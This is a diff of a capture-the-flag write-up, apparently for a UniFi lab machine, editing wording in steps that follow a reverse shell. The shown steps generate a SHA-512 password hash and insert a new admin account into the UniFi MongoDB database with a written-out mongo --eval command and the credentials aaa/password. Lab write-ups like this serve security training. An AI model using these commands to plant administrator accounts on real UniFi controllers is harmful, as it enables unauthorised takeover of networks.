@@ -78,10 +78,10 @@ Python is not installed so please try the following command to improve the shell
 script /dev/null -c bash
 
 ```
-I followed the article for the next steps. Next steps are:
+I followed the article for the next steps. We can either;
 '
 * Extract admin hashes and crack them (requires significant computing power -- I gave up on this)
-* Add a new Admin account  
+* Add a new admin account  
 
 First, we need to generate a password hash for the admin account:
 
@@ -89,12 +89,12 @@ First, we need to generate a password hash for the admin account:
 mkpasswd -m sha-512 password
   ```
   
-Next, we need to enter the New Admin Command in MongoDB via our reverse shell (username = aaa)
+Next, we need to enter the new admin command (db.admin.insert) in MongoDB via our reverse shell (username = aaa)
 
 ```sh
 mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "aaa@localhost.local", "last_site_name" : "default", "name" : "aaa", "time_created" : NumberLong(100019800), "x_shadow" : "$6$piDZ3bwwj/g4psku$MSgskX71AEuwT/sASoYqbZ03ZiRtxtTl/OROc8mBDP4QKwAeB1VGBtIlJdEs5q7rDFpHq7dkM2dAZk/KEhRgx." })'
   ```
-Once the new admin account is inserted in the MongoDB, we are ready to login to the UniFi Network Account. 
+Once the new admin account is inserted in the MongoDB, we are ready to login to the UniFi Network Account (username: aaa, pasword: password)
 Unfortunately the website did not work so I captured the flag from the official walkthorough document :)
   
 ![image](https://user-images.githubusercontent.com/99097743/170099143-838be26d-0d3a-479c-a619-2c1aef01ceec.png)
